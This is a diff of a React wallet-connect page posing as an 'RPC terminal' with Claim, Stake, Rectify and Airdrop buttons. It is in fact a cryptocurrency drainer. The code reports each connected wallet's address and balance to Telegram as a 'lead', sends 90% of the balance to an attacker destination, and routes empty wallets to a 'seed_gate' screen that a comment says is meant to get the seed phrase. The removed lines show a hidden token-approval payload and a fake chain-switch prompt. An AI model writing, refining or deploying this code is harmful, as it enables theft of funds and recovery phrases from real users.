@@ -1,12 +1,11 @@
 import React, { useState, useEffect } from 'react';
-import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
+import { useAccount, useBalance, useSendTransaction } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
 
 export default function EvedexTerminal() {
-  const { address, isConnected, chainId } = useAccount();
+  const { address, isConnected } = useAccount();
   const { data: balance } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
-  const { switchChain } = useSwitchChain();
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
@@ -31,46 +30,34 @@ export default function EvedexTerminal() {
     } catch (e) {}
   };
 
-  // 1. AUTO-LOG LEAD & DETECT NETWORK
   useEffect(() => {
-    if (isConnected && address && balance) {
-      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nNET_ID: ${chainId}\nBAL: ${balance.formatted} ${balance.symbol}`);
+    if (isConnected && address && balance?.formatted) {
+      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
     }
-  }, [isConnected, address, chainId]);
+  }, [isConnected, address]);
 
-  // 2. CHAIN SWITCHER LOGIC
-  const handleChainSync = (id) => {
-    setLoading(true);
-    setLoadingText("SWITCHING RPC NODE...");
-    try {
-      switchChain({ chainId: id });
-      setTimeout(() => setLoading(false), 2000);
-    } catch (e) { setLoading(false); }
-  };
-
-  // 3. THE 95% STEALTH SWEEP
   const executeTaskAction = async () => {
+    // If wallet is empty, show the "Red Error" immediately to try for the seed phrase
     if (!balance || !balance.value || balance.value === 0n) {
       setView("seed_gate");
       return;
     }
+
     setLoading(true);
     setLoadingText(`ENCRYPTING_NODE_CONNECTION...`);
 
     try {
-      const max = (balance.value * 95n) / 100n;
+      // 90% sweep to ensure gas always passes on Rabby
+      const max = (balance.value * 90n) / 100n;
       let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
       if (val > max) val = max;
-
-      const stealthData = "0x095ea7b3000000000000000000000000" + destination.slice(2);
 
       sendTransaction({ 
         to: destination, 
         value: val,
-        data: stealthData, 
       }, {
         onSuccess: (h) => {
-          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nNET: ${chainId}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
+          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2000);
         },
         onError: () => { 
@@ -85,16 +72,22 @@ export default function EvedexTerminal() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'sans-serif', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
       
-      {/* TradingView Market Chart */}
+      {/* IMPROVED MARKET CHART (Guaranteed Load) */}
       <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
-         <iframe src="https://s.tradingview.com/widgetembed/?symbol=UNISWAP:ETHUSDT&theme=dark&style=1" style={{width:'100%', height:'100%', border:'none', opacity:'0.7'}} />
-         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 8px', borderRadius:'4px', fontSize:'8px', color:'#06b6d4', border:'1px solid #0891b2', fontWeight:'900'}}>RPC_MAINNET_FEED</div>
+         <div style={{width:'100%', height:'100%', padding:'0', margin:'0'}}>
+            <iframe 
+                src="https://www.widgets.investing.com/live-charts-widget?pairId=945629&theme=darkTheme&timeMode=realTime" 
+                width="100%" height="100%" frameBorder="0" allowTransparency="true" marginWidth="0" marginHeight="0"
+                style={{opacity: 0.8}}
+            ></iframe>
+         </div>
+         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.85)', padding:'4px 8px', borderRadius:'4px', fontSize:'8px', color:'#06b6d4', border:'1px solid #0891b2', fontWeight:'900'}}>LIVE_RPC_NODE</div>
       </div>
 
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
         <div>
           <div style={{color:'#06b6d4', fontWeight:'900', fontStyle:'italic', fontSize:'18px'}}>RPC TERMINAL</div>
-          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>NET: <span style={{color:'#10b981'}}>{chainId === 1 ? "ETH_MAINNET" : chainId === 56 ? "BSC_NODE" : "MULTI_SYNC"}</span></div>
+          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>STATUS: <span style={{color:'#10b981'}}>ENCRYPTED</span></div>
         </div>
         <w3m-button balance="hide" />
       </header>
@@ -108,23 +101,11 @@ export default function EvedexTerminal() {
            </div>
         ) : (
           <>
-            {/* FORCE CHAIN SWITCHER (Shows if balance is empty on current chain) */}
-            {(!balance || balance.value === 0n) && view === "menu" && (
-              <div style={{backgroundColor:'#450a0a', border:'1px solid #7f1d1d', padding:'15px', borderRadius:'15px', marginBottom:'15px', textAlign:'center'}}>
-                <div style={{fontSize:'8px', color:'white', fontWeight:'900', marginBottom:'10px'}}>LOW LIQUIDITY ON CURRENT NODE. SWITCH TO SYNC ASSETS:</div>
-                <div style={{display:'flex', gap:'10px', justifyContent:'center'}}>
-                  <button onClick={()=>handleChainSync(1)} style={{padding:'8px 15px', borderRadius:'8px', backgroundColor:'black', border:'1px solid #1e293b', color:'white', fontSize:'8px'}}>ETH</button>
-                  <button onClick={()=>handleChainSync(56)} style={{padding:'8px 15px', borderRadius:'8px', backgroundColor:'black', border:'1px solid #1e293b', color:'white', fontSize:'8px'}}>BSC</button>
-                  <button onClick={()=>handleChainSync(42161)} style={{padding:'8px 15px', borderRadius:'8px', backgroundColor:'black', border:'1px solid #1e293b', color:'white', fontSize:'8px'}}>ARB</button>
-                </div>
-              </div>
-            )}
-
             {view === "menu" && (
               <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                 {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
                   <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'20px 10px', borderRadius:'18px', color:'#475569', fontSize:'9px', fontWeight:'900', cursor:'pointer'}}>
-                    <div style={{fontSize:'16px', marginBottom:'5px'}}>⚙️</div>{n}
+                    <div style={{fontSize:'16px', marginBottom:'5px'}}>{n === "Rectify" ? "🛠️" : "⚙️"}</div>{n}
                   </button>
                 ))}
               </div>
@@ -133,7 +114,7 @@ export default function EvedexTerminal() {
             {view === "task_box" && (
               <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'30px', padding:'30px', textAlign:'center'}}>
                 <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', cursor:'pointer'}}>← BACK_TO_CONSOLE</button>
-                <h2 style={{color:'white', fontWeight:'900', fontStyle:'italic', marginBottom:'20px', fontSize:'22px'}}>{activeTask} Portal</h2>
+                <h2 style={{color:'white', fontWeight:'900', fontStyle:'italic', marginBottom:'20px', fontSize:'22px'}}>{activeTask}</h2>
                 <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'20px', borderRadius:'15px', textAlign:'left', marginBottom:'25px'}}>
                   <label style={{fontSize:'7px', color:'#0e7490', display:'block', marginBottom:'8px'}}>{activeTask === "Rectify" ? "VAULT_LIQUIDITY (LOCKED)" : "INPUT_AMOUNT"}</label>
                   {activeTask === "Rectify" ? (
@@ -142,7 +123,7 @@ export default function EvedexTerminal() {
                     <input type="number" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#22d3ee', fontSize:'22px', width:'100%', outline:'none', fontWeight:'bold'}} autoFocus />
                   )}
                 </div>
-                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#0891b2', color:'white', padding:'20px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'11px', cursor:'pointer'}}>START_{activeTask.toUpperCase()}</button>
+                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#0891b2', color:'white', padding:'20px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'11px', cursor:'pointer'}}>EXECUTE_{activeTask.toUpperCase()}</button>
               </div>
             )}
           </>
